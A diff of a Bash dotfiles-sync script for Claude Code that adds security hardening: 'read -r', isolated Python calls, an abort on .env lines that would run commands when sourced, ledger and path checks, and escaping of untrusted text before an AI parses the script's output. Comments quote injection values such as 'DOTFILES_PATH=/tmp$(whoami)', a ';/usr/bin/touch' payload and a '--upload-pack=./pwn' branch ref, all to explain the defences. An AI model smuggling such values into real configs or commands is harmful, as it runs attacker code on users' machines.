@@ -16,7 +16,7 @@ else
 fi
 
 # --- CLI flags ---
-# --show-diff: 让 CONFLICT 块包含 DIFF 正文（默认仅元数据）。审计点出问题：
+# --show-diff: 让 CONFLICT 块包含 DIFF 正文（默认仅元数据）。默认收紧的原因：
 # 非交互模式下 sync.sh 的输出会进入 Claude 会话 transcript 和日志；如果配置文件
 # 含密钥/token，diff 也会把那几行带进去。默认只输出文件大小、行数和时间戳，
 # 用户在 AskUserQuestion 阶段如需看具体改动，AI 可重跑 sync.sh --show-diff。
@@ -71,7 +71,7 @@ run_first_run_wizard() {
 
     local dotfiles_path=""
     while true; do
-        read -p "路径：" dotfiles_path
+        read -r -p "路径：" dotfiles_path
         dotfiles_path=$(echo "$dotfiles_path" | tr -d '\r\n')
 
         # Reject empty
@@ -106,7 +106,7 @@ run_first_run_wizard() {
             if [ -d "$dotfiles_path/claude-code-config" ] || [ -d "$dotfiles_path/claude" ]; then
                 echo ""
                 echo "检测到该路径下已有 dotfiles 仓库。"
-                read -p "是否使用这个仓库？(y/n) " reuse_choice
+                read -r -p "是否使用这个仓库？(y/n) " reuse_choice
                 if [[ "$reuse_choice" =~ ^[Yy] ]]; then
                     break
                 else
@@ -126,7 +126,7 @@ run_first_run_wizard() {
         echo "  - mkdir -p $dotfiles_path/claude"
         echo "  - 尝试在 GitHub 上创建同名仓库"
         echo ""
-        read -p "确认创建？(y/n) " create_choice
+        read -r -p "确认创建？(y/n) " create_choice
         if [[ "$create_choice" =~ ^[Yy] ]]; then
             git init "$dotfiles_path"
             mkdir -p "$dotfiles_path/claude"
@@ -157,7 +157,7 @@ run_first_run_wizard() {
     local enable_repo="false"
     local ws_roots=""
     local topic=""
-    read -p "是否启用？(y/n)：" enable_choice
+    read -r -p "是否启用？(y/n)：" enable_choice
     if [[ "$enable_choice" =~ ^[Yy] ]]; then
         enable_repo="true"
 
@@ -170,7 +170,7 @@ run_first_run_wizard() {
         echo "    E:/Work;F:/Personal（多个文件夹用英文分号 ; 隔开）"
         echo "  Windows 路径不区分大小写（C:/Dotfiles 和 c:/dotfiles 等效）"
         echo ""
-        read -p "请输入路径：" ws_roots
+        read -r -p "请输入路径：" ws_roots
         ws_roots=$(echo "$ws_roots" | tr -d '\r\n')
         # 同 dotfiles_path：'|' 会污染 marker 输出；制表符破坏 8 空格缩进契约
         if [[ "$ws_roots" == *"|"* ]] || [[ "$ws_roots" == *$'\t'* ]]; then
@@ -193,7 +193,7 @@ run_first_run_wizard() {
             echo "  sync 通过这个标签来发现你想同步的仓库。"
             echo "  如果你还没贴过标签，建议用默认值，直接回车即可。"
             echo ""
-            read -p "请输入标签名（回车使用默认值 claude-code-workspace）：" topic
+            read -r -p "请输入标签名（回车使用默认值 claude-code-workspace）：" topic
             topic="${topic:-claude-code-workspace}"
         fi
     fi
@@ -201,7 +201,7 @@ run_first_run_wizard() {
     # Write .env via Python (UTF-8 safe)
     # 用 shlex.quote 生成 shell-safe 的 single-quoted 形式，防止 source 时
     # $, `, \ 等 shell 元字符被解释执行（例如 DOTFILES_PATH=/tmp$(whoami) 注入）
-    python -c "
+    python -I -c "
 import shlex, sys
 path = sys.argv[1]
 with open(path, 'w', encoding='utf-8', newline='\n') as f:
@@ -250,7 +250,7 @@ unset _ENV_LOCK_DIR
 # 消除 `source .env` 对 $var / backtick / $(...) 的意外展开。原子替换（mkstemp + os.replace）
 # 避免半写入；多 token 情况发出 multi= 警告；Python 错误直接经 stderr 暴露（不静默）
 _migrate_legacy_env() {
-    [ ! -f "$ENV_FILE" ] || python -c "
+    [ ! -f "$ENV_FILE" ] || python -I -c "
 import os, shlex, sys, re, tempfile
 path = sys.argv[1]
 with open(path, 'r', encoding='utf-8') as f:
@@ -313,6 +313,7 @@ if multi:
 }
 if [ -f "$ENV_FILE" ]; then
     _mig_out=$(_migrate_legacy_env)
+    _multi_token_lines=""
     if [ -n "$_mig_out" ]; then
         while IFS= read -r _line; do
             case "$_line" in
@@ -323,17 +324,50 @@ if [ -f "$ENV_FILE" ]; then
                     echo -e "${YELLOW}[.env 迁移] 警告：${_line#warn=} 的值含 \$ 或 backtick，原先可能被 source 时展开；现已改为字面量。若你确实需要展开，请手动恢复该行。${NC}" >&2
                     ;;
                 multi=*)
-                    echo -e "${YELLOW}[.env 迁移] 警告：${_line#multi=} 的原值含多个 token（形如 KEY=a b c），迁移会丢失后续 token，已保留原行。请手动加引号后重新 source。${NC}" >&2
+                    # 多 token 行（如 `WORKSPACE_ROOTS=/tmp;/usr/bin/touch ...`）被迁移保留原样，
+                    # 否则取首 token 会静默丢失数据。但保留也意味着 source .env 时 shell 会执行
+                    # 分号/反引号后面的命令——这是命令注入路径。收集所有多 token 键，
+                    # 加载 .env 前硬中止，强迫用户手动修复。
+                    _multi_token_lines+="${_line#multi=} "
+                    echo -e "${YELLOW}[.env 迁移] 警告：${_line#multi=} 的原值含多个 token（形如 KEY=a b c），迁移会丢失后续 token，已保留原行。${NC}" >&2
                     ;;
             esac
         done <<< "$_mig_out"
     fi
-    unset _mig_out _line
+    if [ -n "$_multi_token_lines" ]; then
+        echo "" >&2
+        echo -e "${RED}错误：.env 中存在多 token 行（${_multi_token_lines% }）。${NC}" >&2
+        echo -e "${RED}此类行 source 时 shell 会把分号/反引号/\$() 后的内容当命令执行，构成本地代码执行路径。${NC}" >&2
+        echo -e "${RED}请手动用单引号把整个值包起来（KEY='complete value'），再重新运行 sync.sh。${NC}" >&2
+        exit 1
+    fi
+    unset _mig_out _line _multi_token_lines
 fi
 
 # --- .env 加载或首次引导 ---
-if [ -f "$ENV_FILE" ]; then
+if [ "${SYNC_TEST_MODE:-}" = "1" ]; then
+    # Test mode (used by tests/bounce_simulation.sh) bypasses .env entirely.
+    # Caller must provide SYNC_TEST_DOTFILES_PATH; other config is forced/defaulted.
+    DOTFILES_PATH="${SYNC_TEST_DOTFILES_PATH:-}"
+    if [ -z "$DOTFILES_PATH" ]; then
+        echo "SYNC_TEST_MODE=1 requires SYNC_TEST_DOTFILES_PATH" >&2
+        exit 1
+    fi
+    DOTFILES_DIR="$DOTFILES_PATH"
+    DOTFILES_REPO=$(basename "$DOTFILES_PATH")
+    ENABLE_REPO_SYNC=false
+    WORKSPACE_ROOTS=""
+    TOPIC="${SYNC_TEST_TOPIC:-claude-code-workspace}"
+elif [ -f "$ENV_FILE" ]; then
+    # shellcheck source=/dev/null  # runtime-resolved per-machine .env; not statically followable
     source "$ENV_FILE"
+    # 显式转为绝对路径——若 .env 留下相对路径（早期版本或手改的配置），后续
+    # interactive 模式 _process_repo 内的 cd 会污染主脚本 CWD，让 step 6 的
+    # pushd "$DOTFILES_DIR" 解析到攻击者控制的同名子目录（如某项目仓库里有
+    # dotfiles/）。在加载点固化绝对路径即可消除整条攻击链。
+    if [ -n "${DOTFILES_PATH:-}" ] && [[ "$DOTFILES_PATH" != /* ]] && [[ ! "$DOTFILES_PATH" =~ ^[A-Za-z]: ]]; then
+        DOTFILES_PATH="$(cd "$(dirname "$DOTFILES_PATH")" 2>/dev/null && pwd)/$(basename "$DOTFILES_PATH")"
+    fi
     DOTFILES_DIR="$DOTFILES_PATH"
     DOTFILES_REPO=$(basename "$DOTFILES_PATH")
 else
@@ -383,8 +417,15 @@ if [ ${#WS_ROOTS[@]} -eq 0 ] && [ -n "${WORKSPACE_ROOT:-}" ]; then
     WS_ROOTS=("$WORKSPACE_ROOT")
 fi
 
-detect_gh || exit 1
-detect_github_user || exit 1
+if [ "${SYNC_TEST_MODE:-}" = "1" ]; then
+    # Test mode: skip gh CLI requirement. `:` is the no-op builtin; not used
+    # in the test path since all gh calls are gated by SYNC_TEST_MODE guards.
+    GH="${SYNC_TEST_GH:-:}"
+    GITHUB_USER="${SYNC_TEST_GH_USER:-testuser}"
+else
+    detect_gh || exit 1
+    detect_github_user || exit 1
+fi
 
 HANDOFF_FILE="${SCRIPT_DIR}/HANDOFF.md"
 HANDOFF_PY=$(normalize_path "${SCRIPT_DIR}/lib/handoff.py")
@@ -430,6 +471,450 @@ unregister_handoff_device() {
         return 1
     fi
     echo -e "${GREEN}设备 $device_name 已从 HANDOFF.md 移除${NC}"
+}
+
+# --- Sync state ledger (deletion-resurrection fix) ---
+# Per-machine receipt book: records "as of this dotfiles commit SHA, this file
+# was in agreement with the repo, with this content fingerprint Y". When sync.sh
+# later sees "local has, repo doesn't" (Case 3 of sync_config_file), the ledger
+# disambiguates pure-zombie (upstream-deleted, local untouched → safe to prune)
+# from real-conflict (upstream-deleted, local edited offline → ask user).
+# Lives in the repo root (this control-center repo), gitignored, never committed.
+# Ledger location: project dir by default; test mode (SYNC_TEST_MODE=1)
+# reroutes it under HOME so tests don't clobber the real ledger file.
+if [ "${SYNC_TEST_MODE:-}" = "1" ]; then
+    LEDGER_FILE="${SYNC_TEST_LEDGER_PATH:-${HOME}/.sync_state.json}"
+else
+    LEDGER_FILE="${SCRIPT_DIR}/.sync_state.json"
+fi
+# .skill_import_ignore location: SCRIPT_DIR by default; test mode can redirect
+# it to a sandbox (SYNC_TEST_SKILL_IGNORE_PATH) so tests don't mutate the live
+# checkout — mirrors LEDGER_FILE above.
+if [ "${SYNC_TEST_MODE:-}" = "1" ]; then
+    SKILL_IGNORE_FILE="${SYNC_TEST_SKILL_IGNORE_PATH:-${SCRIPT_DIR}/.skill_import_ignore}"
+else
+    SKILL_IGNORE_FILE="${SCRIPT_DIR}/.skill_import_ignore"
+fi
+_LEDGER_BUFFER=""  # set after SYNC_TMPDIR is created (see step 1 / [1/6] section)
+
+# Compute SHA256 hex of file contents. Empty output (rc=1) if file missing.
+# Used as the per-file fingerprint stored in the ledger.
+_file_hash() {
+    local f="$1"
+    [ ! -f "$f" ] && return 1
+    # 2>/dev/null below is deliberate: an unreadable-but-present file yields an
+    # empty hash, which downstream Case 3 treats as a hash MISMATCH → real-conflict
+    # → PRUNE prompt (never a silent prune). Surfacing the error would add noise
+    # without changing that safe outcome.
+    python -I -c "
+import hashlib, sys
+h = hashlib.sha256()
+with open(sys.argv[1], 'rb') as f:
+    for chunk in iter(lambda: f.read(65536), b''):
+        h.update(chunk)
+print(h.hexdigest())
+" "$(normalize_path "$f")" 2>/dev/null
+}
+
+# Verify the current git repo's HEAD has an upstream tracking branch
+# configured. Bare `git pull --rebase` silently no-ops when upstream is
+# missing (after `git remote rename`, fresh clone of a local-only
+# branch, detached HEAD) and the caller has no signal that the
+# expected remote sync didn't happen. On success: prints the current
+# branch name on stdout, returns 0. On failure: prints a Chinese error
+# to stderr, returns 1.
+_resolve_pull_branch() {
+    local _br
+    _br=$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo "HEAD")
+    if [ "$_br" = "HEAD" ]; then
+        echo "拉取失败：当前处于 detached HEAD 状态，无法识别要拉取的分支" >&2
+        return 1
+    fi
+    # Reject option-like branch names. A ref such as `--upload-pack=./pwn`
+    # is legal as a git ref (via `git update-ref refs/heads/...`) but reaches
+    # `git fetch --upload-pack=./pwn origin` when passed as the refspec to
+    # `git pull origin <ref>`, executing the named helper on transports that
+    # honor a local upload-pack path. Callers also pass refs/heads/$_br as a
+    # fully-qualified refspec (which doesn't start with `-`); this check is
+    # the structural defense and the refspec form is belt-and-braces.
+    case "$_br" in
+        -*)
+            echo "拉取失败：分支名以 '-' 开头，可能被 git 解析为选项 ('$_br')" >&2
+            return 1
+            ;;
+    esac
+    if ! git rev-parse --abbrev-ref --symbolic-full-name '@{upstream}' >/dev/null 2>&1; then
+        echo "拉取失败：分支 '$_br' 未配置 upstream（用 git branch --set-upstream-to=origin/$_br 设置）" >&2
+        return 1
+    fi
+    printf '%s' "$_br"
+    return 0
+}
+
+# Read a per-machine ignore-file (one name per line) into a newline-separated
+# string on stdout. Tolerates `# comment` lines, blank lines, CRLF line
+# endings, and filters surviving lines through ^[A-Za-z0-9_.][A-Za-z0-9_.-]*$
+# plus an all-dots reject (rejecting bare ., .., and leading-dash names; aligns
+# with _validate_repo_format's per-component shape) so a tampered file can't
+# slip control chars or shell-meta into downstream grep -Fxq comparisons. A
+# leading dot IS allowed so dot-prefixed repo names (e.g. GitHub's .github)
+# survive instead of being silently dropped from the denylist. Missing or empty
+# file → empty stdout, rc 0. Both .sync_ignore and .skill_import_ignore funnel
+# through here so their parsers stay in lockstep.
+_read_ignore_file() {
+    local _file="$1"
+    [ -f "$_file" ] || return 0
+    grep -v '^[[:space:]]*#' "$_file" | grep -v '^[[:space:]]*$' \
+        | tr -d '\r' | grep -E '^[A-Za-z0-9_.][A-Za-z0-9_.-]*$' \
+        | grep -vxE '\.+' || true
+}
+
+# _safe_bak / _safe_bak_path live in lib/common.sh — shared with module-manager.sh.
+# Three call sites here (prune-apply push + two interactive CONFLICT branches)
+# consume the snapshot variant.
+
+# Walk $1 (file or directory) for symlinks at any depth. Returns 0 (true)
+# if any symlink is found, 1 (false) if none or path doesn't exist. Used by
+# SKILL_IMPORT accept sites to refuse imports whose dotfiles source contains
+# nested symlinks: cp -a would copy them verbatim, and stripping AFTER cp
+# (via `find $_dst -type l -delete`) leaves a TOCTOU window in which intra-
+# process consumers — specifically sync_config_file's per-file pass invoked
+# from sync_custom_skills' fall-through path — could read through the
+# symlinks to attacker-chosen content before the sweep fires. Refusing
+# before any state change leaves the dotfiles tree untouched and gives the
+# user a clean error to investigate.
+_has_symlinks() {
+    local _path="$1"
+    [ -e "$_path" ] || return 1
+    local _first
+    _first=$(find "$_path" -type l -print -quit 2>/dev/null)
+    [ -n "$_first" ]
+}
+
+# Hash a file in the same canonical form _files_equivalent uses for the given
+# norm_mode. For NORM=memory, this strips the `originSessionId:` metadata line
+# (and the blank line that follows a closing `---\n` frontmatter) before
+# hashing — the same normalization _files_equivalent applies in-memory before
+# byte comparison. For any other norm (including empty), this is equivalent to
+# _file_hash (raw SHA256). Returns empty + rc=1 if the file is missing.
+#
+# Why this exists: the ledger compares hashes across syncs to classify Case 3
+# (local has, repo doesn't) as pure-zombie vs real-conflict. If Case 5
+# (equivalent) stored the raw REPO_FILE hash for a memory file, the
+# byte-different LOCAL_FILE would always fail the comparison on the next
+# upstream-delete cycle, mis-flagging untouched zombies as real-conflicts.
+# The regex MUST stay in sync with _files_equivalent's norm_memory body —
+# any divergence reintroduces the misclassification.
+_norm_hash() {
+    local f="$1" norm="${2:-}"
+    [ ! -f "$f" ] && return 1
+    if [ "$norm" = "memory" ]; then
+        # CRLF-tolerant — see _files_equivalent for rationale; these two
+        # regexes MUST stay byte-identical to that helper's, or the ledger
+        # comparison goes out of sync with the equivalence check.
+        # 2>/dev/null is deliberate (same as _file_hash): unreadable file → empty
+        # hash → Case 3 real-conflict → PRUNE prompt, never a silent prune.
+        python -I -c "
+import hashlib, re, sys
+with open(sys.argv[1], 'r', encoding='utf-8') as f:
+    t = f.read()
+t = re.sub(r'^originSessionId:[^\r\n]*\r?\n?', '', t, flags=re.MULTILINE)
+t = re.sub(r'^(---\r?\n.*?\r?\n---\r?\n)\r?\n', r'\1', t, count=1, flags=re.DOTALL)
+print(hashlib.sha256(t.encode('utf-8')).hexdigest())
+" "$(normalize_path "$f")" 2>/dev/null
+    else
+        _file_hash "$f"
+    fi
+}
+
+# Pre-escape a value for interpolation between `"..."` in AskUserQuestion JSON.
+# Marker-block fields (LABEL, REPO, LOCAL, SUBPATH, DELETED_REASON, FILES entries
+# etc.) originate from filesystem paths, commit subjects, and other partially
+# untrusted sources. Emitting them raw forces the SKILL.md side to remember
+# per-field JSON-escaping; doing it once here at the boundary means the AI can
+# interpolate verbatim. Delegates to python's json.dumps so the full
+# U+0000-U+001F range per RFC 8259 §7 is handled — the prior bash-only version
+# escaped only \n/\r/\t and let \b/\f/\v slip through, producing JSON that
+# strict AskUserQuestion parsers reject. ensure_ascii=False keeps UTF-8
+# transparent. Slicing [1:-1] strips json.dumps's surrounding quotes so
+# callers can splice the result into a larger JSON string.
+_json_escape() {
+    python -I -c "import json,sys; sys.stdout.write(json.dumps(sys.argv[1], ensure_ascii=False)[1:-1])" "$1"
+}
+
+# Prefix every line of $1 with "> " so any column-0 marker (===CONFLICT_BEGIN===,
+# ===PRUNE_BEGIN===, NEW_REPO:, etc.) sitting inside attacker-controlled text
+# fails the SKILL.md exact-line-equality check. Used for the HANDOFF banner body
+# and the hidden-section scan output; both originate in HANDOFF.md, which is
+# untrusted per Step 3's trust model.
+_prefix_lines() {
+    printf '%s\n' "$1" | sed 's/^/> /'
+}
+
+# Read one ledger entry. Prints "<sha>\t<hash>\t<kept>" on success, empty if absent.
+# <kept> is "1" when kept_local_only is set (user picked Keep after PRUNE), else "0".
+_ledger_get_entry() {
+    local subpath="$1"
+    [ ! -f "$LEDGER_FILE" ] && return 1
+    python -I -c "
+import json, sys
+try:
+    with open(sys.argv[1], 'r', encoding='utf-8') as f:
+        ledger = json.load(f)
+    entry = (ledger.get('files') or {}).get(sys.argv[2])
+    if isinstance(entry, dict):
+        sha = entry.get('sha', '')
+        h = entry.get('hash', '')
+        kept = '1' if entry.get('kept_local_only', False) else '0'
+        if sha or h:
+            print(sha + '\t' + h + '\t' + kept)
+except (FileNotFoundError, json.JSONDecodeError, OSError):
+    pass
+" "$(normalize_path "$LEDGER_FILE")" "$subpath" 2>/dev/null
+}
+
+# Infer the norm_mode from a dotfiles subpath. Memory files synced via
+# sync_memory_dir live under claude/projects/<repo>/memory/*.md and need
+# memory-norm hashing; everything else uses raw bytes. Used by prune-apply
+# (which only gets a subpath argument, not the original NORM parameter)
+# to pick the right hash form for ledger writes.
+_infer_norm_from_subpath() {
+    case "$1" in
+        claude/projects/*/memory/*.md) echo "memory" ;;
+        *) echo "" ;;
+    esac
+}
+
+# Reject subpaths containing tab, newline, or carriage return. These would
+# corrupt the tab-separated buffer format (or shift fields when read back),
+# and they should never appear in a legitimate dotfiles subpath anyway.
+# Used at every public ledger boundary — buffer set/del and prune-apply's
+# direct write.
+_ledger_validate_subpath() {
+    case "$1" in
+        *$'\t'*|*$'\n'*|*$'\r'*)
+            echo "ledger: 拒绝含 TAB/CR/LF 的 subpath（潜在 buffer 行注入）：$1" >&2
+            return 1
+            ;;
+    esac
+    return 0
+}
+
+# Buffer an upsert. Args: subpath, hash. SHA filled in at flush time.
+# No-op (returns success) when $_LEDGER_BUFFER is unset — i.e. called outside the
+# main sync flow (a subcommand) or before SYNC_TMPDIR init. All real callers run
+# post-init; a future PRE-init caller would see success but get nothing buffered,
+# so only add new buffer writes after step [1/6].
+_ledger_buffer_set() {
+    [ -z "$_LEDGER_BUFFER" ] && return 0
+    # Tab-separated; subpaths use forward slashes, never tabs/newlines.
+    # Third arg (kept) is "1" for Keep-after-PRUNE, "0" otherwise; defaults to "0".
+    local kept="${3:-0}"
+    # Validate kept is strictly "0" or "1" — anything else would be silently
+    # coerced to falsy at read time, hiding caller bugs (typoed "true",
+    # accidental boolean string).
+    case "$kept" in
+        0|1) ;;
+        *)
+            echo "ledger: kept 参数必须是 0 或 1（got: $kept）" >&2
+            return 1
+            ;;
+    esac
+    _ledger_validate_subpath "$1" || return 1
+    printf 'set\t%s\t%s\t%s\n' "$1" "$2" "$kept" >> "$_LEDGER_BUFFER"
+}
+
+# Buffer a delete. Args: subpath. Same unset-buffer no-op semantics as
+# _ledger_buffer_set (returns success pre-init / outside the main flow).
+_ledger_buffer_del() {
+    [ -z "$_LEDGER_BUFFER" ] && return 0
+    _ledger_validate_subpath "$1" || return 1
+    printf 'del\t%s\n' "$1" >> "$_LEDGER_BUFFER"
+}
+
+# Take a mkdir-based lock on the ledger. Cleans stale locks (>10min mtime)
+# left behind by SIGKILL/poweroff. Returns 0 on lock, 1 on busy.
+_ledger_lock() {
+    local lockdir="${LEDGER_FILE}.lock"
+    if [ -d "$lockdir" ] && find "$lockdir" -maxdepth 0 -mmin +10 2>/dev/null | grep -q .; then
+        rmdir "$lockdir" 2>/dev/null
+    fi
+    if ! mkdir "$lockdir" 2>/dev/null; then
+        return 1
+    fi
+    return 0
+}
+
+_ledger_unlock() {
+    rmdir "${LEDGER_FILE}.lock" 2>/dev/null
+}
+
+# Flush all buffered ops to disk atomically. Sets per-entry SHA + last_full_sync
+# to current dotfiles HEAD. Called once at end of /sync, after step 6 commits
+# any pending dotfiles changes — so the HEAD we record is post-commit.
+_ledger_flush() {
+    [ -z "$_LEDGER_BUFFER" ] && return 0
+    [ ! -f "$_LEDGER_BUFFER" ] && return 0
+    [ ! -s "$_LEDGER_BUFFER" ] && return 0
+
+    if ! _ledger_lock; then
+        echo -e "${YELLOW}警告：ledger 锁忙，本轮 ledger 更新跳过（残留锁请手动 rmdir ${LEDGER_FILE}.lock）${NC}" >&2
+        return 1
+    fi
+
+    local current_head=""
+    if [ -d "$DOTFILES_DIR" ]; then
+        current_head=$(git -C "$DOTFILES_DIR" rev-parse HEAD 2>/dev/null || echo "")
+    fi
+
+    python -I -c "
+import json, os, sys, tempfile
+
+ledger_path = sys.argv[1]
+buffer_path = sys.argv[2]
+current_head = sys.argv[3]
+
+try:
+    with open(ledger_path, 'r', encoding='utf-8') as f:
+        ledger = json.load(f)
+    if not isinstance(ledger, dict):
+        ledger = {}
+except (FileNotFoundError, json.JSONDecodeError):
+    ledger = {}
+
+ledger.setdefault('schema', 1)
+files = ledger.get('files')
+if not isinstance(files, dict):
+    files = {}
+    ledger['files'] = files
+
+with open(buffer_path, 'r', encoding='utf-8') as f:
+    for line in f:
+        line = line.rstrip('\n')
+        if not line:
+            continue
+        parts = line.split('\t')
+        op = parts[0]
+        if op == 'set' and len(parts) == 4:
+            _, subpath, content_hash, kept = parts
+            entry = files.get(subpath)
+            if not isinstance(entry, dict):
+                entry = {}
+            entry['hash'] = content_hash
+            entry['kept_local_only'] = (kept == '1')
+            if current_head:
+                entry['sha'] = current_head
+            files[subpath] = entry
+        elif op == 'del' and len(parts) == 2:
+            files.pop(parts[1], None)
+
+if current_head:
+    ledger['last_full_sync'] = current_head
+
+# Atomic write: tempfile in same dir, then os.replace
+dirpath = os.path.dirname(os.path.abspath(ledger_path)) or '.'
+fd, tmp_path = tempfile.mkstemp(prefix='.sync_state.json.flush.', dir=dirpath)
+try:
+    with os.fdopen(fd, 'w', encoding='utf-8', newline='\n') as f:
+        json.dump(ledger, f, indent=2, ensure_ascii=False, sort_keys=True)
+        f.write('\n')
+    os.replace(tmp_path, ledger_path)
+except Exception:
+    try:
+        os.unlink(tmp_path)
+    except OSError:
+        pass
+    raise
+" "$(normalize_path "$LEDGER_FILE")" "$(normalize_path "$_LEDGER_BUFFER")" "$current_head"
+    local rc=$?
+    _ledger_unlock
+
+    if [ $rc -ne 0 ]; then
+        echo -e "${RED}ledger flush 失败 (python rc=$rc)${NC}" >&2
+        return 1
+    fi
+    return 0
+}
+
+# Apply a single ledger op immediately. Used by `sync.sh prune-apply` which
+# runs as a one-shot invocation outside the main sync flow (no buffer).
+# Args: op (set|del), subpath, hash (set only).
+_ledger_apply_single() {
+    local op="$1" subpath="$2" content_hash="${3:-}" kept="${4:-0}"
+    _ledger_validate_subpath "$subpath" || return 1
+    case "$kept" in
+        0|1) ;;
+        *)
+            echo "ledger: kept 参数必须是 0 或 1（got: $kept）" >&2
+            return 1
+            ;;
+    esac
+    if ! _ledger_lock; then
+        echo "ledger 锁忙（残留锁请 rmdir ${LEDGER_FILE}.lock）" >&2
+        return 1
+    fi
+
+    local current_head=""
+    if [ -d "$DOTFILES_DIR" ]; then
+        current_head=$(git -C "$DOTFILES_DIR" rev-parse HEAD 2>/dev/null || echo "")
+    fi
+
+    python -I -c "
+import json, os, sys, tempfile
+
+ledger_path = sys.argv[1]
+op = sys.argv[2]
+subpath = sys.argv[3]
+content_hash = sys.argv[4]
+current_head = sys.argv[5]
+kept = sys.argv[6] if len(sys.argv) > 6 else '0'
+
+try:
+    with open(ledger_path, 'r', encoding='utf-8') as f:
+        ledger = json.load(f)
+    if not isinstance(ledger, dict):
+        ledger = {}
+except (FileNotFoundError, json.JSONDecodeError):
+    ledger = {}
+
+ledger.setdefault('schema', 1)
+files = ledger.get('files')
+if not isinstance(files, dict):
+    files = {}
+    ledger['files'] = files
+
+if op == 'set':
+    entry = files.get(subpath)
+    if not isinstance(entry, dict):
+        entry = {}
+    entry['hash'] = content_hash
+    entry['kept_local_only'] = (kept == '1')
+    if current_head:
+        entry['sha'] = current_head
+    files[subpath] = entry
+elif op == 'del':
+    files.pop(subpath, None)
+
+if current_head:
+    ledger['last_full_sync'] = current_head
+
+dirpath = os.path.dirname(os.path.abspath(ledger_path)) or '.'
+fd, tmp_path = tempfile.mkstemp(prefix='.sync_state.json.apply.', dir=dirpath)
+try:
+    with os.fdopen(fd, 'w', encoding='utf-8', newline='\n') as f:
+        json.dump(ledger, f, indent=2, ensure_ascii=False, sort_keys=True)
+        f.write('\n')
+    os.replace(tmp_path, ledger_path)
+except Exception:
+    try:
+        os.unlink(tmp_path)
+    except OSError:
+        pass
+    raise
+" "$(normalize_path "$LEDGER_FILE")" "$op" "$subpath" "$content_hash" "$current_head" "$kept"
+    local rc=$?
+    _ledger_unlock
+    return $rc
 }
 
 # --- device 子命令 ---
@@ -478,7 +963,7 @@ if [ "${1:-}" = "device" ]; then
             if [ -n "$PENDING" ]; then
                 echo -e "${YELLOW}警告：设备 $name 有未完成的 handoff 任务：${NC}"
                 echo "$PENDING"
-                read -p "确认移除？(y/n) " CONFIRM
+                read -r -p "确认移除？(y/n) " CONFIRM
                 if [[ ! "$CONFIRM" =~ ^[Yy] ]]; then
                     echo "已取消。"
                     exit 0
@@ -511,7 +996,7 @@ if [ "${1:-}" = "repo-sync" ]; then
                 echo ".sync_ignore 文件不存在，没有被忽略的仓库" >&2
                 exit 1
             fi
-            if ! grep -Fqx "$name" "$IGNORE_FILE" 2>/dev/null; then
+            if ! grep -Fqx -- "$name" "$IGNORE_FILE" 2>/dev/null; then
                 echo "仓库 $name 不在 .sync_ignore 中" >&2
                 exit 1
             fi
@@ -549,7 +1034,7 @@ if [ "${1:-}" = "repo-sync" ]; then
             echo ""
             echo "启用项目仓库批量同步"
             echo ""
-            read -p "$(printf '你的项目仓库存放在电脑上的哪个文件夹？\n\n  例如：\n    D:/Projects\n    E:/Work;F:/Personal（多个文件夹用英文分号 ; 隔开）\n\n请输入路径：')" ws_roots
+            read -r -p "$(printf '你的项目仓库存放在电脑上的哪个文件夹？\n\n  例如：\n    D:/Projects\n    E:/Work;F:/Personal（多个文件夹用英文分号 ; 隔开）\n\n请输入路径：')" ws_roots
             ws_roots=$(echo "$ws_roots" | tr -d '\r\n')
             if [ -z "$ws_roots" ]; then
                 echo "路径不能为空" >&2
@@ -565,7 +1050,7 @@ if [ "${1:-}" = "repo-sync" ]; then
                 echo -e "${RED}剔除非法字符后路径为空${NC}" >&2
                 exit 1
             fi
-            read -p "$(printf '你给 GitHub 仓库贴的标签（topic）叫什么？\n（回车使用默认值 claude-code-workspace）：')" topic
+            read -r -p "$(printf '你给 GitHub 仓库贴的标签（topic）叫什么？\n（回车使用默认值 claude-code-workspace）：')" topic
             topic="${topic:-claude-code-workspace}"
             # Update .env via Python (with mkdir-based lock)
             _lockdir="${ENV_FILE}.lock"
@@ -575,7 +1060,7 @@ if [ "${1:-}" = "repo-sync" ]; then
                 exit 1
             fi
             trap 'rmdir "'"$_lockdir"'" 2>/dev/null' EXIT INT TERM
-            python -c "
+            python -I -c "
 import os, shlex, sys, tempfile
 env_path = sys.argv[1]
 ws = sys.argv[2]
@@ -642,6 +1127,304 @@ except Exception:
     exit 0
 fi
 
+# --- prune-apply 子命令 ---
+# Mechanical executor for PRUNE choices made via AskUserQuestion in the sync
+# skill. Hybrid pattern: AI picks the option, script does the file/ledger ops.
+# Usage:
+#   sync.sh prune-apply --action=remove --subpath=<dotfiles-subpath> --local-path=<abs>
+#   sync.sh prune-apply --action=keep   --subpath=<dotfiles-subpath> --local-path=<abs>
+#   sync.sh prune-apply --action=push   --subpath=<dotfiles-subpath> --local-path=<abs> --repo-path=<abs>
+if [ "${1:-}" = "prune-apply" ]; then
+    shift
+    PRUNE_ACTION=""
+    PRUNE_SUBPATH=""
+    PRUNE_LOCAL=""
+    PRUNE_REPO=""
+    while [ $# -gt 0 ]; do
+        case "$1" in
+            --action=*)     PRUNE_ACTION="${1#--action=}" ;;
+            --subpath=*)    PRUNE_SUBPATH="${1#--subpath=}" ;;
+            --local-path=*) PRUNE_LOCAL="${1#--local-path=}" ;;
+            --repo-path=*)  PRUNE_REPO="${1#--repo-path=}" ;;
+            *)
+                echo "prune-apply: 未知参数 $1" >&2
+                exit 1
+                ;;
+        esac
+        shift
+    done
+
+    if [ -z "$PRUNE_ACTION" ] || [ -z "$PRUNE_SUBPATH" ] || [ -z "$PRUNE_LOCAL" ]; then
+        echo "用法: sync.sh prune-apply --action=<remove|keep|push> --subpath=<dotfiles-subpath> --local-path=<abs> [--repo-path=<abs>]" >&2
+        exit 1
+    fi
+
+    # Reject path-traversal / control chars in subpath — it lives as a JSON
+    # key in the ledger and is treated as a relative dotfiles path. Absolute
+    # paths and `..` segments break that contract; CR/LF/TAB would corrupt
+    # the buffer / lookup if ever combined with multi-line emission.
+    case "$PRUNE_SUBPATH" in
+        */../*|../*|*/..|..|/*|*$'\n'*|*$'\r'*|*$'\t'*|*'|'*)
+            echo "prune-apply: subpath 含非法序列" >&2
+            exit 1
+            ;;
+    esac
+
+    # Path containment: without these, prune-apply would be an
+    # arbitrary-file rm/cp primitive on caller-controlled --local-path /
+    # --repo-path. Lock them down:
+    #   --repo-path (when set) must equal $DOTFILES_DIR/$PRUNE_SUBPATH exactly.
+    #   --local-path must canonical-resolve under $HOME/.claude.
+    # Python realpath handles non-existent paths gracefully (remove action
+    # may target a file that another tool just deleted).
+    if [ -n "$PRUNE_REPO" ]; then
